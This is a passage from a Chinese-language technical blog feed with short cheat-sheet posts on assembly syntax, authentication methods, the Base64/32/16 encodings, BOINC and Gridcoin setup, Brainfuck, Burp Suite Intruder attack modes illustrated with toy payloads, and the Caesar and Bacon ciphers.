<h2 id="伪指令"><a href="#伪指令" class="headerlink" title="伪指令"></a>伪指令</h2><p>伪指令依赖于具体的汇编器，这里我们以 GNU 中的 as 汇编器（gas）为例，讲述常见的伪指令及其含义：</p>
<ul>
<li><code>.set</code>：为变量设置一个值，如 <code>.set CR0_PE_ON, 0x1</code>。</li>
<li><code>.globl</code> 或 <code>.global</code>：设置外部链接，使其在其他文件中可被调用，如 <code>.globl start</code>。</li>
<li><code>.code16</code>：生成 16 位汇编代码。</li>
<li><code>.code32</code>：生成 32 位汇编代码。</li>
<li><code>.p2align</code>：</li>
<li><code>.word</code>：</li>
<li><code>.long</code>：</li>
</ul>
<p>想要了解更多的伪指令可以参考 <a href="https://sourceware.org/binutils/docs/as/Pseudo-Ops.html#Pseudo-Ops">gas 的官方文档</a>。</p>
<h2 id="标号"><a href="#标号" class="headerlink" title="标号"></a>标号</h2><p>标号代表一个地址，类似于高级语言中的函数，在需要时可以使用跳转指令跳转到标号处执行，利用标号还可以实现死循环，如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">spin:</span><br><span class="line">    jmp spin</span><br></pre></td></tr></table></figure>

<h2 id="风格"><a href="#风格" class="headerlink" title="风格"></a>风格</h2><p>x86 汇编语言的两大风格分别是 <strong>Intel 风格</strong>和 <strong>AT&amp;T 风格</strong>，分别被 Microsoft 和 GNU 所采用，两种风格的详细区别如下表所示：</p>
<table>
<thead>
<tr>
<th>项目</th>
<th>Intel 风格</th>
<th>AT&amp;T 风格</th>
</tr>
</thead>
<tbody><tr>
<td>操作数顺序</td>
<td>目标操作数在前，如 <code>mov eax,8</code></td>
<td>源操作数在前，如 <code>movl $8,%eax</code></td>
</tr>
<tr>
<td>寄存器名字</td>
<td>原样，如 <code>mov eax,8</code></td>
<td>加 <code>%</code> 前缀，如 <code>movl $8,%eax</code></td>
</tr>
<tr>
<td>立即数</td>
<td>原样，如 <code>mov eax,8</code></td>
<td>加 <code>$</code> 前缀，如 <code>movl $8,%eax</code></td>
</tr>
<tr>
<td>16进制立即数</td>
<td>用后缀 <code>b</code> 与 <code>h</code> 分别表示二进制与十六进制，对于 16 进制字母开头的要加前缀 <code>0</code></td>
<td>加前缀 <code>0x</code></td>
</tr>
<tr>
<td>访问内存长度的表示</td>
<td>前缀 <code>byte ptr</code>，<code>word ptr</code>，<code>dword ptr</code></td>
<td>后缀 <code>b</code>、<code>w</code>、<code>l</code>表示字节、字、长型</td>
</tr>
<tr>
<td>引用全局或静态变量 var 的值</td>
<td>[_var]</td>
<td>_var</td>
</tr>
<tr>
<td>引用全局或静态变量 var 的地址</td>
<td>_var</td>
<td>$_var</td>
</tr>
<tr>
<td>寄存器间址</td>
<td>[reg]</td>
<td>(%reg)</td>
</tr>
<tr>
<td>寄存器变址寻址</td>
<td>[reg + _x]</td>
<td>_x(%reg)</td>
</tr>
<tr>
<td>立即数变址寻址</td>
<td>[reg + 1]</td>
<td>1(%reg)</td>
</tr>
<tr>
<td>整数数组寻址</td>
<td>[eax*4 + array]</td>
<td>_array (,%eax, 4)</td>
</tr>
<tr>
<td>注释</td>
<td>:注释以英文分号开头</td>
<td>#注释以井号开头</td>
</tr>
</tbody></table>
<p>本文的书写风格以 Intel 风格为主。</p>
<h2 id="内联汇编"><a href="#内联汇编" class="headerlink" title="内联汇编"></a>内联汇编</h2><p>内联汇编（Inline Assembly）是指在 C 代码中嵌入汇编代码，显然，其语法是由具体的 C 编译器所决定的，这里主要以 GNU 中的 gcc 编译器为例简述其语法。</p>
<h2 id="更多"><a href="#更多" class="headerlink" title="更多"></a>更多</h2><p>要了解汇编语言更多的知识，可以阅读王爽的<a href="https://book.douban.com/subject/25726019/">《汇编语言》</a>一书，这本书基于 16 位的 8086 CPU 来讲解汇编，虽然处理器已过时，但思想永不褪色。</p>
<p>其次，<a href="https://www.ibm.com/developerworks/cn/linux/l-assembly/index.html">Linux 汇编语言开发指南</a>，也是一篇不错的介绍文章。</p>
]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
  </entry>
  <entry>
    <title>身份认证的几种方式</title>
    <url>/2018/11/16/authentication/</url>
    <content><![CDATA[<p>身份认证的目的是确认当前所声称为某种身份的用户，确实是所声称的用户。简单来说，就是为了确认<strong>你是你</strong>。</p>
<p>身份认证大致可分为三种：基于生物学特征的身份认证、基于共享密钥的身份认证以及基于公钥加密算法的身份认证，以下分别说明：</p>
<a id="more"></a>
<h2 id="基于生物学特征的身份认证"><a href="#基于生物学特征的身份认证" class="headerlink" title="基于生物学特征的身份认证"></a>基于生物学特征的身份认证</h2><p>基于生物学特征的身份认证是指基于每个人身体上独一无二的特征，如指纹、虹膜等等。</p>
<p>这种认证方式极具便利性，但同时安全性也最低，此外，生物学特征信息一旦泄露，无法更改。</p>
<h2 id="基于共享密钥的身份认证"><a href="#基于共享密钥的身份认证" class="headerlink" title="基于共享密钥的身份认证"></a>基于共享密钥的身份认证</h2><p>基于共享密钥的身份认证是指服务器端和用户共同拥有一个或一组密码。用户通过输入或通过保管有密码的设备提交由用户和服务器共同拥有的密码，服务器检查用户所提交的密码是否与服务器端保存的密码一致，如果一致，就判断用户为合法用户，否则判定身份验证失败。</p>
<p>这种认证方式是目前互联网上所广泛应用的。</p>
<h2 id="基于公钥加密算法的身份认证"><a href="#基于公钥加密算法的身份认证" class="headerlink" title="基于公钥加密算法的身份认证"></a>基于公钥加密算法的身份认证</h2><p>基于公钥加密算法的身份认证是指通信中的双方分别持有公钥和私钥，由其中的一方采用私钥对特定数据进行加密，而对方采用公钥对数据进行解密，如果解密成功，就认为用户是合法用户，否则就认为是身份验证失败。</p>
<p>很难说明，<strong>基于共享密钥的身份认证</strong>和<strong>基于公钥加密算法的身份认证</strong>哪个更为安全，<strong>基于共享密钥的身份认证</strong>的不安全处主要在于共享密钥的传播过程中，而<strong>基于公钥加密算法的身份认证</strong>的不安全处则主要在于私钥的存储过程中。</p>
<hr>
<p>为了提升身份认证的安全性，有时会结合使用以上三种认证方式，这便是<strong>多因素认证</strong>（Multi-factor authentication），如果只使用了以上三种认证方式中的两种，则又称为<strong>双因素认证</strong>（Two-factor authentication），简称 <strong>2FA</strong>。</p>
]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
  </entry>
  <entry>
    <title>强大的autojump</title>
    <url>/2018/09/19/autojump/</url>
    <content><![CDATA[]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Base 编码家族</title>
    <url>/2018/08/10/base/</url>
    <content><![CDATA[<h2 id="Base64"><a href="#Base64" class="headerlink" title="Base64"></a>Base64</h2><p>Base64，顾名思义是一种基于 <strong>64</strong> 个可打印字符来表示二进制数据的表示方法，这 64 个字符分别为 <code>A-Z</code>、<code>a-z</code>、<code>0-9</code> 以及 <code>+</code> 与 <code>/</code>。64 个字符可用 6 个比特位表示，3 个字节有 24 个比特位，对应于 4 个 Base64 单元，所以编码后的数据要比原始数据略长，为原来的 4/3。Base64 索引表如下所示：</p>
<table>
<thead>
<tr>
<th>数值</th>
<th>字符</th>
<th>数值</th>
<th>字符</th>
<th>数值</th>
<th>字符</th>
<th>数值</th>
<th>字符</th>
</tr>
</thead>
<tbody><tr>
<td>0</td>
<td>A</td>
<td>16</td>
<td>Q</td>
<td>32</td>
<td>g</td>
<td>48</td>
<td>w</td>
</tr>
<tr>
<td>1</td>
<td>B</td>
<td>17</td>
<td>R</td>
<td>33</td>
<td>h</td>
<td>49</td>
<td>x</td>
</tr>
<tr>
<td>2</td>
<td>C</td>
<td>18</td>
<td>S</td>
<td>34</td>
<td>i</td>
<td>50</td>
<td>y</td>
</tr>
<tr>
<td>3</td>
<td>D</td>
<td>19</td>
<td>T</td>
<td>35</td>
<td>j</td>
<td>51</td>
<td>z</td>
</tr>
<tr>
<td>4</td>
<td>E</td>
<td>20</td>
<td>U</td>
<td>36</td>
<td>k</td>
<td>52</td>
<td>0</td>
</tr>
<tr>
<td>5</td>
<td>F</td>
<td>21</td>
<td>V</td>
<td>37</td>
<td>l</td>
<td>53</td>
<td>1</td>
</tr>
<tr>
<td>6</td>
<td>G</td>
<td>22</td>
<td>W</td>
<td>38</td>
<td>m</td>
<td>54</td>
<td>2</td>
</tr>
<tr>
<td>7</td>
<td>H</td>
<td>23</td>
<td>X</td>
<td>39</td>
<td>n</td>
<td>55</td>
<td>3</td>
</tr>
<tr>
<td>8</td>
<td>I</td>
<td>24</td>
<td>Y</td>
<td>40</td>
<td>o</td>
<td>56</td>
<td>4</td>
</tr>
<tr>
<td>9</td>
<td>J</td>
<td>25</td>
<td>Z</td>
<td>41</td>
<td>p</td>
<td>57</td>
<td>5</td>
</tr>
<tr>
<td>10</td>
<td>K</td>
<td>26</td>
<td>a</td>
<td>42</td>
<td>q</td>
<td>58</td>
<td>6</td>
</tr>
<tr>
<td>11</td>
<td>L</td>
<td>27</td>
<td>b</td>
<td>43</td>
<td>r</td>
<td>59</td>
<td>7</td>
</tr>
<tr>
<td>12</td>
<td>M</td>
<td>28</td>
<td>c</td>
<td>44</td>
<td>s</td>
<td>60</td>
<td>8</td>
</tr>
<tr>
<td>13</td>
<td>N</td>
<td>29</td>
<td>d</td>
<td>45</td>
<td>t</td>
<td>61</td>
<td>9</td>
</tr>
<tr>
<td>14</td>
<td>O</td>
<td>30</td>
<td>e</td>
<td>46</td>
<td>u</td>
<td>62</td>
<td>+</td>
</tr>
<tr>
<td>15</td>
<td>P</td>
<td>31</td>
<td>f</td>
<td>47</td>
<td>v</td>
<td>63</td>
<td>/</td>
</tr>
</tbody></table>
<a id="more"></a>
<p>编码 <code>Hello</code> 的过程如下：</p>
<table>
<thead>
<tr>
<th>文本</th>
<th>H</th>
<th>e</th>
<th>l</th>
<th>l</th>
<th>o</th>
<th></th>
</tr>
</thead>
<tbody><tr>
<td>ASCII 编码</td>
<td>72</td>
<td>101</td>
<td>108</td>
<td>108</td>
<td>111</td>
<td></td>
</tr>
<tr>
<td>二进制位</td>
<td>‭01001000‬</td>
<td>‭01100101‬</td>
<td>‭01101100‬</td>
<td>‭01101100‬</td>
<td>‭01101111‬</td>
<td>00000000</td>
</tr>
</tbody></table>
<p>以6个二进制位进行编码：</p>
<table>
<thead>
<tr>
<th>二进制位</th>
<th>010010</th>
<th>000110</th>
<th>010101</th>
<th>101100</th>
<th>011011</th>
<th>000110</th>
<th>111100</th>
<th>000000</th>
</tr>
</thead>
<tbody><tr>
<td>索引</td>
<td>18</td>
<td>6</td>
<td>21</td>
<td>44</td>
<td>27</td>
<td>6</td>
<td>60</td>
<td></td>
</tr>
<tr>
<td>Base64 编码</td>
<td>S</td>
<td>G</td>
<td>V</td>
<td>s</td>
<td>b</td>
<td>G</td>
<td>8</td>
<td>=</td>
</tr>
</tbody></table>
<p>若原数据不是 3 的倍数，且多出 1 个字节，则在编码末尾加 2 个 <code>=</code>，多出 2 个字节，则在编码末尾加 1 个 <code>=</code>。换言之，若多出 1 个字节，则最后一个 6 位的 Base64 字节块有 4 位是 0 值，若多出 2 个字节，则最后一个 6 位的 Base64 字节块有 2 位是 0 值。</p>
<h2 id="Base32"><a href="#Base32" class="headerlink" title="Base32"></a>Base32</h2><p>与上类似，Base32 基于 32 个可打印字符，分别为 <code>A-Z</code> 以及 <code>2-7</code>。32 个字符可用 5 个比特位表示，5 个字节有 40 个比特位，对应于 8 个 Base32 单元，编码后的数据比原始数据略长 8/5。若原数据不是 5 的倍数，且多出 1 个字节，则在编码末尾加 4 个 <code>=</code>，多出 2 个字节，则在编码末尾加 3 个 <code>=</code>，多出 3 个字节，则在编码末尾加 2 个 <code>=</code>，多出 4 个字节，则在编码末尾加 1 个 <code>=</code>。Base32 索引表如下所示：</p>
<table>
<thead>
<tr>
<th>数值</th>
<th>字符</th>
<th>数值</th>
<th>字符</th>
<th>数值</th>
<th>字符</th>
<th>数值</th>
<th>字符</th>
</tr>
</thead>
<tbody><tr>
<td>0</td>
<td>A</td>
<td>8</td>
<td>I</td>
<td>16</td>
<td>Q</td>
<td>24</td>
<td>Y</td>
</tr>
<tr>
<td>1</td>
<td>B</td>
<td>9</td>
<td>J</td>
<td>17</td>
<td>R</td>
<td>25</td>
<td>Z</td>
</tr>
<tr>
<td>2</td>
<td>C</td>
<td>10</td>
<td>K</td>
<td>18</td>
<td>S</td>
<td>26</td>
<td>2</td>
</tr>
<tr>
<td>3</td>
<td>D</td>
<td>11</td>
<td>L</td>
<td>19</td>
<td>T</td>
<td>27</td>
<td>3</td>
</tr>
<tr>
<td>4</td>
<td>E</td>
<td>12</td>
<td>M</td>
<td>20</td>
<td>U</td>
<td>28</td>
<td>4</td>
</tr>
<tr>
<td>5</td>
<td>F</td>
<td>13</td>
<td>N</td>
<td>21</td>
<td>V</td>
<td>29</td>
<td>5</td>
</tr>
<tr>
<td>6</td>
<td>G</td>
<td>14</td>
<td>O</td>
<td>22</td>
<td>W</td>
<td>30</td>
<td>6</td>
</tr>
<tr>
<td>7</td>
<td>H</td>
<td>15</td>
<td>P</td>
<td>23</td>
<td>X</td>
<td>31</td>
<td>7</td>
</tr>
</tbody></table>
<h2 id="Base16"><a href="#Base16" class="headerlink" title="Base16"></a>Base16</h2><p>与上类似，Base16 基于 16 个可打印字符，分别为 <code>0-9</code> 以及 <code>A-F</code>。16 个字符可用 4 个比特位表示，1 个字节有 8 个比特位，对应于 2 个 Base16 单元，编码后的数据比原始数据略长 2。显然，在 Base16 中不需要在末尾填充 <code>=</code>。Base16 索引表如下所示：</p>
<table>
<thead>
<tr>
<th>数值</th>
<th>字符</th>
<th>数值</th>
<th>字符</th>
<th>数值</th>
<th>字符</th>
<th>数值</th>
<th>字符</th>
</tr>
</thead>
<tbody><tr>
<td>0</td>
<td>0</td>
<td>4</td>
<td>4</td>
<td>8</td>
<td>8</td>
<td>12</td>
<td>C</td>
</tr>
<tr>
<td>1</td>
<td>1</td>
<td>5</td>
<td>5</td>
<td>9</td>
<td>9</td>
<td>13</td>
<td>D</td>
</tr>
<tr>
<td>2</td>
<td>2</td>
<td>6</td>
<td>6</td>
<td>10</td>
<td>A</td>
<td>14</td>
<td>E</td>
</tr>
<tr>
<td>3</td>
<td>3</td>
<td>7</td>
<td>7</td>
<td>11</td>
<td>B</td>
<td>15</td>
<td>F</td>
</tr>
</tbody></table>
<h2 id="Base64URL"><a href="#Base64URL" class="headerlink" title="Base64URL"></a>Base64URL</h2><p>Base64URL 编码是在 Base64 编码的结果的基础上做的一些修改，主要是为了方便编码后的字符串在网络中传输。其做的修改如下：</p>
<ol>
<li>去除尾部的 <code>=</code></li>
<li>将 <code>+</code> 替换成 <code>-</code></li>
<li>将 <code>/</code> 替换成 <code>_</code></li>
</ol>
<p>类似的，解码为原 Base64 编码结果，遵循如下步骤：</p>
<ol>
<li>将 <code>-</code> 替换成 <code>+</code></li>
<li>将 <code>_</code> 替换成 <code>/</code></li>
<li>计算 <code>Base64URL 编码长度 % 4</code> 的值：<br>a. 结果为 0，不做处理<br>b. 结果为 2，字符串添加 <code>==</code><br>c. 结果为 3，字符串添加 <code>=</code></li>
</ol>
<h2 id="XXencode"><a href="#XXencode" class="headerlink" title="XXencode"></a>XXencode</h2><p>XXencode 不属于 Base 编码家族，但与 Base64 编码极为类似，区别仅在于 64 个可打印字符及其顺序，XXencode 使用的为 <code>+</code>、<code>-</code>、<code>0-9</code>、<code>A-Z</code>、<code>a-z</code>。</p>
<h2 id="UUencode"><a href="#UUencode" class="headerlink" title="UUencode"></a>UUencode</h2><p>UUencode 也与 Base64 极为类似，它使用的字符及其顺序为 <code>(space)</code>、<code>!</code>、<code>&quot;</code>、<code>#</code>、<code>$</code>、<code>%</code>、<code>&amp;</code>、<code>&#39;</code>、<code>(</code>、<code>)</code>、<code>*</code>、<code>+</code>、<code>,</code>、<code>-</code>、<code>.</code>、<code>/</code>、<code>0-9</code>、<code>:</code>、<code>;</code>、<code>&lt;</code>、<code>=</code>、<code>&gt;</code>、<code>?</code>、<code>@</code>、<code>A-Z</code>、<code>[</code>、<code>\</code>、<code>]</code>、<code>^</code>、<code>_</code>、`。</p>
]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>密码学</tag>
      </tags>
  </entry>
  <entry>
    <title>巴科斯范式</title>
    <url>/2018/09/12/bnf/</url>
    <content><![CDATA[]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
  </entry>
  <entry>
    <title>使用 BOINC 来挖掘格雷德币</title>
    <url>/2018/12/16/boinc-gridcoin/</url>
    <content><![CDATA[<h2 id="BOINC"><a href="#BOINC" class="headerlink" title="BOINC"></a>BOINC</h2><p><a href="https://boinc.berkeley.edu/">BOINC</a>，全称 Berkeley Open Infrastructure for Network Computing，即伯克利开放式网络计算平台，是由加州大学伯克利分校发展出的分布式计算平台。BOINC 会利用志愿者电脑的空闲资源来对各个项目下发的任务进行运算，目前 BOINC 平台上有如下知名项目：</p>
<ul>
<li><a href="https://setiathome.berkeley.edu/">SETI@home</a>：由加州大学伯克利分校主办，主要目的为搜索外太空文明。</li>
<li><a href="https://einsteinathome.org/zh-cn/home">Einstein@Home</a>：由威斯康星大学密尔沃基分校主办，主要目的为搜索脉冲星的引力波。</li>
<li><a href="http://www.gpugrid.net/index.php">GPUGrid.net</a>：主要目的为做分子生物动力学相关的研究。</li>
<li><a href="https://www.worldcommunitygrid.org/discover.action">IBM World Community Grid</a>：中文翻译为“世界公共网格”，由 IBM 主办，主要目的为利用分布式计算来帮助查找人类疾病的治疗方法，和改善人类生活的相关研究。随着项目的不断扩大，World Community Grid 逐渐发展成为一个医药、生物和环境等各种方面研究类的更高层次分布式计算平台。目前正在该平台上运行的知名子项目包括：<ul>
<li><a href="https://www.worldcommunitygrid.org/research/faah/overview.do?language=zh_CN">FightAIDS@Home</a>：主要目的为研究 HIV 的治疗方法。</li>
</ul>
</li>
</ul>
<a id="more"></a>

<h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p>在 Ubuntu 中，执行如下命令即可安装：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt install boinc-client boinc-manager</span><br></pre></td></tr></table></figure>

<p>如果你想使用 BOINC 来挖掘格雷德币，请不要在首次启动后按照提示添加项目，具体的操作可参考下面的步骤。</p>
<h2 id="Gridcoin"><a href="#Gridcoin" class="headerlink" title="Gridcoin"></a>Gridcoin</h2><p><a href="https://gridcoin.us/">Gridcoin</a>，简称 GRC，中文翻译为“格雷德币”，一种开源的数字货币，其主要用于奖励在 BOINC 平台上参与计算的志愿者。</p>
<p>值得注意的是，并非所有的 BOINC 项目都会奖励格雷德币，只有参与特定的项目才会获得格雷德币，具体的项目列表可参考 Gridcoin 官方的<a href="https://gridcoin.us/Guides/whitelist.htm">项目白名单</a>，这份白名单里也列出了哪些项目会使用到 GPU 进行运算。</p>
<h3 id="矿池"><a href="#矿池" class="headerlink" title="矿池"></a>矿池</h3><p>Gridcoin 官网中提到了 2 个矿池：<a href="https://www.grcpool.com/">grcpool</a> 和 <a href="https://grc.arikado.ru/">Arikado Pool</a>，建议使用 grcpool，以下是为 BOINC 配置 grcpool 矿池的具体过程：</p>
<ol>
<li>前往 grcpool 注册一个账号。</li>
<li>切换到 BOINC 的高级视图：依次点击 <code>View</code> ——&gt; <code>Advanced View</code>。</li>
<li>配置 grcpool 矿池：依次点击 <code>Tools</code> ——&gt; <code>Use Account Manager</code>，打开对话框，选择 <code>grcpool</code>，输入之前注册的账号和密码，并确定。</li>
<li>转到 grcpool 的个人信息页面，点击 <code>Hosts</code> 下的 <code>My Hosts</code>，你将会看到刚刚添加的计算机名，点击进去，选择 <code>choose project</code>，挑选自己感兴趣的项目，点击 <code>add</code>，最后点击页面左上方的 <code>save project settings</code> 进行保存。</li>
<li>在 BOINC 中进行同步：依次点击 <code>Tools</code> ——&gt; <code>Synchronize with grcpool.com</code>，并按照提示完成。</li>
</ol>
]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
  </entry>
  <entry>
    <title>Brainfuck</title>
    <url>/2018/08/09/brainfuck/</url>
    <content><![CDATA[<p>Brainfuck是在1993年创建的一种极小化的计算机语言，由于fuck在英语中是脏话，这种语言有时也被称为Brainf*ck或Brainf***，或被简称为BF。<br>Brainfuck中共有8种字符，它们及其含义如下所示：</p>
<ul>
<li><code>&gt;</code>：指针加一</li>
<li><code>&lt;</code>：指针减一</li>
<li><code>+</code>：指针指向的字节的值加一</li>
<li><code>-</code>：指针指向的字节的值减一</li>
<li><code>.</code>：输出指针指向的单元内容(ASCII码)</li>
<li><code>,</code>：输入内容到指针指向的单元(ASCII码)</li>
<li><code>[</code>：如果指针指向的单元值为零，向后跳转到对应的<code>]</code>指令的次一指令处</li>
<li><code>]</code>：如果指针指向的单元值不为零，向前跳转到对应的<code>[</code>指令的次一指令处</li>
</ul>
<p>下面是一个用Brainfuck在屏幕上打印<code>Hello World</code>的程序例子：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">++++++++++[&gt;+++++++&gt;++++++++++&gt;+++&gt;+&lt;&lt;&lt;&lt;-]</span><br><span class="line">&gt;++.&gt;+.+++++++..+++.&gt;++.&lt;&lt;+++++++++++++++.</span><br><span class="line">&gt;.+++.------.--------.&gt;+.&gt;.</span><br></pre></td></tr></table></figure>
<p>程序的运行结果如<a href="https://fatiherikli.github.io/brainfuck-visualizer/">Brainfuck Visualizer</a>所示。</p>
]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
  </entry>
  <entry>
    <title>Sniper、Battering ram、Pitchfork、Cluster bomb的区别</title>
    <url>/2018/05/01/burpsuite-intruder-attack-type/</url>
    <content><![CDATA[<p>Burp Suite中的Intruder模块里有4种攻击模式，分别为Sniper、Battering ram、Pitchfork、Cluster bomb，在这里假设Payload set1=[1, 2]，Payload set2=[a, b, c, d]：</p>
<h2 id="Sniper"><a href="#Sniper" class="headerlink" title="Sniper"></a>Sniper</h2><p>Sniper，中文“狙击手”，每次只针对1个Payload Position，使用1个Payload set，示例如下：</p>
<table>
<thead>
<tr>
<th>Request</th>
<th>Position1(default:x)</th>
<th>Position2(default:y)</th>
</tr>
</thead>
<tbody><tr>
<td>#1</td>
<td>1</td>
<td>y</td>
</tr>
<tr>
<td>#2</td>
<td>2</td>
<td>y</td>
</tr>
<tr>
<td>#3</td>
<td>x</td>
<td>1</td>
</tr>
<tr>
<td>#4</td>
<td>x</td>
<td>2</td>
</tr>
</tbody></table>
<h2 id="Battering-ram"><a href="#Battering-ram" class="headerlink" title="Battering ram"></a>Battering ram</h2><p>Battering ram，中文“攻城槌”，每次针对多个Payload Position，使用1个Payload set，示例如下：</p>
<table>
<thead>
<tr>
<th>Request</th>
<th>Position1</th>
<th>Position2</th>
</tr>
</thead>
<tbody><tr>
<td>#1</td>
<td>1</td>
<td>1</td>
</tr>
<tr>
<td>#2</td>
<td>2</td>
<td>2</td>
</tr>
</tbody></table>
<h2 id="Pitchfork"><a href="#Pitchfork" class="headerlink" title="Pitchfork"></a>Pitchfork</h2><p>Pitchfork，中文“杈子”，每次针对多个Payload Position，使用多个Payload set，最多支持5个列表，也即5个位置，采用平行模式，请求次数以最小列表项为准，示例如下：</p>
<table>
<thead>
<tr>
<th>Request</th>
<th>Position1</th>
<th>Position2</th>
</tr>
</thead>
<tbody><tr>
<td>#1</td>
<td>1</td>
<td>a</td>
</tr>
<tr>
<td>#2</td>
<td>2</td>
<td>b</td>
</tr>
</tbody></table>
<h2 id="Cluster-bomb"><a href="#Cluster-bomb" class="headerlink" title="Cluster bomb"></a>Cluster bomb</h2><p>Cluster bomb，中文“集束炸弹”，每次针对多个Payload Position，使用多个Payload set，最多支持5个列表，也即5个位置，采用交叉模式，请求次数为各列表项之积，示例如下：</p>
<table>
<thead>
<tr>
<th>Request</th>
<th>Position1</th>
<th>Position2</th>
</tr>
</thead>
<tbody><tr>
<td>#1</td>
<td>1</td>
<td>a</td>
</tr>
<tr>
<td>#2</td>
<td>1</td>
<td>b</td>
</tr>
<tr>
<td>#3</td>
<td>1</td>
<td>c</td>
</tr>
<tr>
<td>#4</td>
<td>1</td>
<td>d</td>
</tr>
<tr>
<td>#5</td>
<td>2</td>
<td>a</td>
</tr>
<tr>
<td>#6</td>
<td>2</td>
<td>b</td>
</tr>
<tr>
<td>#7</td>
<td>2</td>
<td>c</td>
</tr>
<tr>
<td>#8</td>
<td>2</td>
<td>d</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>古典密码学</title>
    <url>/2018/08/10/classical-crypto/</url>
    <content><![CDATA[<p>密码学（Cryptography）大致可分为<strong>古典密码学</strong>（Classic cryptography）和<strong>现代密码学</strong>（Modern cryptography），两者的主要差别在于计算机的使用，一般来说，古典密码学是基于<strong>字符</strong>的，而现代密码学是基于<strong>二进制位</strong>的。古典密码学主要包括两类，即<strong>代换</strong>和<strong>置换</strong>。</p>
<h2 id="代换"><a href="#代换" class="headerlink" title="代换"></a>代换</h2><p>代换密码是将明文中的字符替代成其他字符，即<strong>替代转换</strong>，若整个加密过程中每个字符采用同一张表替代，则为<strong>单表代换密码</strong>，类似的，若整个加密过程中每个字符采用不同的表替代，则为<strong>多表代换密码</strong>，典型的单表代换密码有凯撒密码、培根密码等，多表代换密码有维吉尼亚密码等。</p>
<h3 id="凯撒密码"><a href="#凯撒密码" class="headerlink" title="凯撒密码"></a>凯撒密码</h3><p>凯撒密码（Caesar cipher）就是将明文中的所有字母都在字母表上向后（或向前）按照一个固定数目进行偏移后被替换成密文。例如，当偏移量为 3 时，所有的字母 A 将被替换成 D，B 变成 E，以此类推。</p>
<p>明文 <code>Hello World</code> 的加密过程如下：</p>
<ol>
<li>取偏移量为 3</li>
<li>计算 <code>H</code> 的后 3 位为 <code>K</code></li>
<li>以此类推</li>
<li>密文为：<code>Khoor Zruog</code></li>
</ol>
<p>类似的，解密过程如下：</p>
<ol>
<li>计算 <code>K</code> 的前 3 位为 <code>H</code></li>
<li>以此类推</li>
<li>明文为：<code>Hello World</code></li>
</ol>
<p>注意：当偏移量为 13 时，这种凯撒密码的特例又被称为 <strong>ROT13</strong>（回转 13 位）加密，ROT13 加密是一种<strong>对等加密</strong>（Reciprocal cipher），对等加密是对称加密的一个特例，即该类密码的加密算法是它自己本身的逆反函数，换言之，要对其解密，只需对其密文再次套用加密算法即可。当偏移量未知时，可采用穷举法一个个试，偏移量必定小于 26。</p>
<a id="more"></a>

<h3 id="培根密码"><a href="#培根密码" class="headerlink" title="培根密码"></a>培根密码</h3><p>培根密码（Bacon&#39;s cipher）加密时，明文中的每个字母都会转换成一组 5 个英文字母。其转换依靠下表：</p>
<table>
<thead>
<tr>
<th>明文</th>
<th>密文</th>
<th>明文</th>
<th>密文</th>
<th>明文</th>
<th>密文</th>
<th>明文</th>
<th>密文</th>
</tr>
</thead>
<tbody><tr>
<td>a</td>
<td>AAAAA</td>
<td>g</td>
<td>AABBA</td>
<td>n</td>
<td>ABBAA</td>
<td>t</td>
<td>BAABA</td>
</tr>
<tr>
<td>b</td>
<td>AAAAB</td>
<td>h</td>
<td>AABBB</td>
<td>o</td>
<td>ABBAB</td>
<td>u-v</td>
<td>BAABB</td>
</tr>
<tr>
<td>c</td>
<td>AAABA</td>
<td>i-j</td>
<td>ABAAA</td>
<td>p</td>
<td>ABBBA</td>
<td>w</td>
<td>BABAA</td>
</tr>
<tr>
<td>d</td>
<td>AAABB</td>
<td>k</td>
<td>ABAAB</td>
<td>q</td>
<td>ABBBB</td>
<td>x</td>
<td>BABAB</td>
</tr>
<tr>
<td>e</td>
<td>AABAA</td>
<td>l</td>
<td>ABABA</td>
<td>r</td>
<td>BAAAA</td>
<td>y</td>
<td>BABBA</td>
</tr>
<tr>
<td>f</td>
<td>AABAB</td>
<td>m</td>
<td>ABABB</td>
<td>s</td>
<td>BAAAB</td>
<td>z</td>
<td>BABBB</td>
</tr>
</tbody></table>
<p>按照上表，明文 <code>hello</code> 的密文为 <code>AABBBAABAAABABBABABBABBBA</code>，显然，密文的长度是明文长度的 <strong>5</strong> 倍。</p>
<p>除了上表用来加密小写明文外，还有一张用来加密大写明文的表，如下：</p>
<table>
<thead>
<tr>
<th>明文</th>
<th>密文</th>
<th>明文</th>
<th>密文</th>
<th>明文</th>
<th>密文</th>
<th>明文</th>
<th>密文</th>
<th>明文</th>
<th>密文</th>
</tr>
</thead>
<tbody><tr>
<td>A</td>
<td>aaaaa</td>
<td>G</td>
<td>aabba</td>
<td>M</td>
<td>abbaa</td>
<td>S</td>
<td>baaba</td>
<td>Y</td>
<td>bbaaa</td>
</tr>
<tr>
<td>B</td>
<td>aaaab</td>
<td>H</td>
<td>aabbb</td>
<td>N</td>
<td>abbab</td>
<td>T</td>
<td>baabb</td>
<td>Z</td>
<td>bbaab</td>
</tr>
<tr>
<td>C</td>
<td>aaaba</td>
<td>I</td>
<td>abaaa</td>
<td>O</td>
<td>abbba</td>
<td>U</td>
<td>babaa</td>
<td></td>
<td></td>
</tr>
<tr>
<td>D</td>
<td>aaabb</td>
<td>J</td>
<td>abaab</td>
<td>P</td>
<td>abbbb</td>
<td>V</td>
<td>babab</td>
<td></td>
<td></td>
</tr>
<tr>
<td>E</td>
<td>aabaa</td>
<td>K</td>
<td>ababa</td>
<td>Q</td>
<td>baaaa</td>
<td>W</td>
<td>babba</td>
<td></td>
<td></td>
</tr>
<tr>
<td>F</td>
<td>aabab</td>
<td>L</td>
<td>ababb</td>
<td>R</td>
<td>baaab</td>
<td>X</td>
<td>babbb</td>
<td></td>
<td></td>
</tr>
</tbody></table>
